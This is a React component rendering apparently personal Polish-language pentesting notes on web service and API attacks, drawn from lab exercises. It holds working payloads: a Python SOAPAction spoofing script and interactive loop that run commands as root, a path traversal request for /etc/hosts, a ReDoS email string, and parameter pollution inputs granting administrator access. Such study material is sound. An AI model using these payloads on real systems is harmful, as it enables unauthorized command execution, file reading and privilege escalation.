import web_services_wsdl from '../../../assets/web_services_wsdl.png';
import web_services_wsdl_example from '../../../assets/web_services_wsdl_example.png';
import web_services_wsdl_definition from '../../../assets/web_services_wsdl_definition.png';
import web_services_wsdl_date_type from '../../../assets/web_services_wsdl_date_type.png';
import web_services_wsdl_messages from '../../../assets/web_services_wsdl_messages.png';
import web_services_wsdl_port_type from '../../../assets/web_services_wsdl_port_type.png';
import web_services_wsdl_binding from '../../../assets/web_services_wsdl_binding.png';
import web_services_services from '../../../assets/web_services_services.png';
import web_services_regex from '../../../assets/web_services_regex.png';
import ExampleFrame from '../../exampleFrame/ExampleFrame';

const WebServicesApiAttack = () =>{
    return(
        <section>
            <h1>WEB SERVICE & API ATTACKS</h1>
            <hr />

            <details>
                <summary>Web Services Description Language (WSDL)</summary>
                <p>WSDL oznacza język opisu usługi internetowej. WSDL to plik XML udostępniany przez usługi internetowe, który informuje klientów o świadczonych usługach/metodach, w tym o ich lokalizacji i konwencji wywoływania m</p>
                <p className="important">{`dirb http://<TARGET IP>:3002`}</p>
                <ExampleFrame screen={web_services_wsdl} />
                <div className='waring'>
                    <p>Może również wymagać parametru</p>
                    <p><span className='important'>{`ffuf -w SecLists/Discovery/Web-Content/burp-parameter-names.txt -u 'http://<TARGET IP>:3002/wsdl?FUZZ'`}</span></p>
                </div>
                <ExampleFrame screen={web_services_wsdl_example} />
                <p className='important'>Definition</p>
                <p>Element główny wszystkich plików WSDL. Wewnątrz definicji określana jest nazwa usługi internetowej, deklarowane są wszystkie przestrzenie nazw używane w dokumencie WSDL i definiowane są wszystkie inne elementy usługi.</p>
                <ExampleFrame screen={web_services_wsdl_definition} />

                <p className='important'>Data Types</p>
                <p>Typy danych, które mają być używane w wymienianych wiadomościach.</p>
                <ExampleFrame screen={web_services_wsdl_date_type} />

                <p className='important'>Messages</p>
                <p>Definiuje operacje wejściowe i wyjściowe obsługiwane przez usługę internetową. Innymi słowy, poprzez element Messages definiuje się komunikaty, które mają zostać wymienione i prezentowane albo jako cały dokument, albo jako argumenty, które mają zostać odwzorowane na wywołanie metody.</p>
                <ExampleFrame screen={web_services_wsdl_messages} />

                <p className='important'>Operation</p>
                <p>Definiuje dostępne akcje SOAP wraz z kodowaniem każdej wiadomości.</p>

                <p className='important'>Port Type</p>
                <p>Hermetyzuje każdy możliwy komunikat wejściowy i wyjściowy w operację. Dokładniej definiuje usługę internetową, dostępne operacje i wymieniane wiadomości. Należy pamiętać, że w wersji WSDL 2.0 element interfejsu ma za zadanie definiowanie dostępnych operacji, a w przypadku komunikatów element typów (danych) zajmuje się ich definiowaniem.</p>
                <ExampleFrame screen={web_services_wsdl_port_type} />
                
                <p className='important'>Binding</p>
                <p>Wiąże operację z określonym typem portu. Pomyśl o powiązaniach jako o interfejsach. Klient wywoła odpowiedni typ portu i korzystając ze szczegółów dostarczonych przez powiązanie, będzie mógł uzyskać dostęp do operacji powiązanych z tym typem portu. Innymi słowy, powiązania dostarczają szczegółów dostępu do usług internetowych, takich jak format wiadomości, operacje, komunikaty i interfejsy (w przypadku WSDL w wersji 2.0).</p>
                <ExampleFrame screen={web_services_wsdl_binding} />
                
                <p className='important'>Service</p>
                <p>Klient wywołuje usługę internetową, korzystając z nazwy usługi określonej w znaczniku usługi. Za pomocą tego elementu Klient identyfikuje lokalizację usługi internetowej.</p>
                <ExampleFrame screen={web_services_services} />
            </details>

            <hr />

            <details>
                <summary>SOAP Action Spoofing</summary>
                <p>Zwróćmy uwagę na te fragmenty</p>
                <div className='waring'>
                    <p>{`<wsdl:operation name="ExecuteCommand">`}</p>
                    <p>{`<soap:operation soapAction="ExecuteCommand" style="document"/>`}</p>
                </div>

                <p>Przyjrzyjmy się parametrom.</p>

                <div className='waring'>
                    <p>{`<s:element name="ExecuteCommandRequest">`}</p>
                    <p>{`<s:complexType>`}</p>
                    <p>{`<s:sequence>`}</p>
                    <p>{`<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>`}</p>
                    <p>{`</s:sequence>`}</p>
                    <p>{`</s:complexType>`}</p>
                    <p>{`</s:element>`}</p>
                </div>

                <p>Zbudujmy skrypt w języku Python dla naszego ataku polegającego na fałszowaniu SOAPAction (zapisz go jako <span className='important'>client_soapaction_spoofing.py</span>).</p>

                <div className='waring'>
                    <p>{`import requests`}</p>
                    <p>{`payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/">`}<span className='important'>{`<soap:Body><LoginRequest xmlns="http://tempuri.org/">`}<span className='error'>{`<cmd>whoami</cmd>`}</span><span className='important'>{`</LoginRequest></soap:Body>`}</span></span>{`</soap:Envelope>'`}</p>
                    <p>{`print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"`}<span className='important'>{`ExecuteCommand`}</span>{`"'}).content)`}</p>
                </div>

                <ul>
                    <li>Podajemy LoginRequest w {`<soap:Body>`}, aby nasze żądanie zostało zrealizowane. Ta operacja jest dozwolona z zewnątrz.</li>
                    <li>Określamy parametry <span className='important'>ExecuteCommand</span>, ponieważ chcemy, aby usługa SOAP wykonała polecenie <span className='important'>whoami</span>.</li>
                    <li>W nagłówku (header) SOAPAction podajemy zablokowaną operację (ExecuteCommand).</li>
                </ul>

                <div className='waring'>
                    <p>Rezultat</p>
                    <p>{`b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success>`}<span className='important'>{`<result>root</result>`}</span>{`</LoginResponse></soap:Body></soap:Envelope>'`}</p>
                </div>

                <div className='waring'>
                    <p>Zautomatyzowany skrypt</p>
                    <p>import requests</p>
                    <br />
                    <p>while True:</p>
                    <p className='tab-1'>cmd = input("$ ")</p>
                    <p className='tab-1'>{`payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/">`}<span className='important'>{`<cmd>{cmd}</cmd>`}</span>{`</LoginRequest></soap:Body></soap:Envelope>'`}</p>
                    <p className='tab-1'>{`print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)`}</p>
                </div>
                <div className='waring'>
                    <p>python3 automate.py</p>
                    <p>$ <span className='important'>id</span></p>
                    <p>{`b'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginResponse xmlns="http://tempuri.org/"><success>true</success>`}<span className='important'>{`<result>uid=0(root) gid=0(root) groups=0(root)</result>`}</span>{`</LoginResponse></soap:Body></soap:Envelope>'`}</p>
                </div>
            </details>

            <hr />

            <details>
                <summary>Enumeracja Api</summary>
                <div className='waring'>
                    <p>ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt" -u 'http://{`<TARGET IP>`}:3000/api/FUZZ'</p>
                    <br />
                    <br />
                    <p>download                [Status: 200, Size: 71, Words: 5, Lines: 1]</p>
                </div>

                <div className='waring'>
                    <p> curl http://{`<TARGET IP>`}:3000/api/download</p>
                    <br />
                    <p>{`{"success":false,"error":"Input the filename via /download/<filename>"}`}</p>
                    <br />
                    <br />
                    <p>curl "http://{`<TARGET IP>`}:3000/api/download/<span className='important'>{`..%2f..%2f..%2f..%2fetc%2fhosts`}</span>"</p>
                </div>
            </details>


            <hr />
                
            <details>
                <summary>Regular Expression Denial of Service (ReDoS)</summary>
                <div className='waring'>
                    <p>{`$ curl "http://<TARGET IP>:3000/api/check-email?email=test_value"`}</p>    
                    <br />
                    <br />
                    <p>{`{"regex":"/^([a-zA-Z0-9_.-])+@(([a-zA-Z0-9-])+.)+([a-zA-Z0-9]{2,4})+$/","success":false}`}</p>
                </div>

                <ExampleFrame screen={web_services_regex} />
                <p>Druga i trzecia grupa wykonują złe kontrole iteracyjne. Prześlijmy następującą prawidłową wartość i zobaczmy, ile czasu zajmie interfejsowi API odpowiedź.</p>

                <div className='waring'>
                    <p>curl "http://{`<TARGET IP>`}:3000/api/check-email?email=<span className='important'>jjjjjjjjjjjjjjjjjjjjjjjjjjjj@ccccccccccccccccccccccccccccc.55555555555555555555555555555555555555555555555555555555</span>."</p>
                </div>
                <p>Zauważysz, że odpowiedź interfejsu API zajmuje kilka sekund, a dłuższe ładunki <span className='important'>wydłużają czas oceny</span>. Różnica w czasie odpowiedzi pomiędzy pierwszym poleceniem cURL powyżej a drugim jest znacząca. API jest bez wątpienia <span className='important'>podatne na ataki ReDoS</span>.</p>
            </details>

            <hr />
                
            <details>
                <summary>Testing for server-side parameter pollution in the query string</summary>
                <p>Aby przetestować zanieczyszczenie parametrów po stronie serwera w ciągu zapytania, umieść w danych wejściowych znaki składni zapytania, takie jak #, & i = i obserwuj, jak aplikacja zareaguje.</p>
                <h2>Truncating query strings - # (%23)</h2>
                <p>Możesz użyć znaku # zakodowanego w adresie URL, aby spróbować obciąć żądanie po stronie serwera.</p>
                <div className='waring'>
                    <p>GET /userSearch?name=peter<span className='important'>%23foo</span>&back=/home</p>
                </div>

                <h2>Injecting invalid parameters - & (%26)</h2>
                <p>Możesz użyć znaku & zakodowanego w adresie URL, aby spróbować dodać drugi parametr do żądania po stronie serwera.</p>
                <div className='waring'>
                    <p>GET /userSearch?name=peter<span className='important'>%26foo=xyz</span>&back=/home</p>
                </div>

                <h2>Overriding existing parameters</h2>
                <p>Aby sprawdzić, czy aplikacja jest podatna na zanieczyszczenie parametrów po stronie serwera, możesz spróbować zastąpić oryginalny parametr. Zrób to, wstrzykując drugi parametr o tej samej nazwie.</p>
                <div className='waring'>
                    <p>GET /userSearch?name=peter<span className='important'>%26name=carlos</span>&back=/home</p>
                </div>
                <p>Wewnętrzny interfejs API interpretuje dwa parametry nazw. Wpływ tego zależy od tego, jak aplikacja przetwarza drugi parametr. Różni się to w zależności od technologii internetowych. Na przykład:</p>
                <p>PHP analizuje tylko ostatni parametr. Spowodowałoby to wyszukiwanie przez użytkownika hasła Carlos.</p>
                <p>ASP.NET łączy oba parametry. Spowodowałoby to wyszukiwanie przez użytkownika hasła peter,carlos, co mogłoby skutkować wyświetleniem komunikatu o błędzie nieprawidłowej nazwy użytkownika.</p>
                <p>Node.js / express analizuje tylko pierwszy parametr.</p>

                <h2>Testowanie zanieczyszczenia parametrów po stronie serwera w ustrukturyzowanych formatach danych</h2>
                <div className='waring'>
                    <p>POST /myaccount</p>
                    <p>name=peter</p>
                </div>
                <div className='waring'>
                    <p>POST /myaccount</p>
                    <p>name=peter<span className='waring'>","access_level":"administrator</span></p>
                </div>
                <hr />
                <div className='waring'>
                    <p>PATCH /users/7312/update</p>
                    <p>{`{"name":"peter"}`}</p>
                </div>
                <div className='waring'>
                    <p>PATCH /users/7312/update</p>
                    <p>{`{"name":"peter`}<span className='important'>","access_level":"administrator</span>{`"}`}</p>
                </div>
                <hr />
                <div className='waring'>
                    <p>POST /myaccount</p>
                    <p>{`{"name":"peter"}`}</p>
                </div>
                <div className='waring'>
                    <p>PATCH /users/7312/update</p>
                    <p>{`{"name":"peter`}<span className='important'>\",\"access_level\":\"administrator</span>{`"}`}</p>
                </div>
            </details>

        </section>
    )
}

export default WebServicesApiAttack;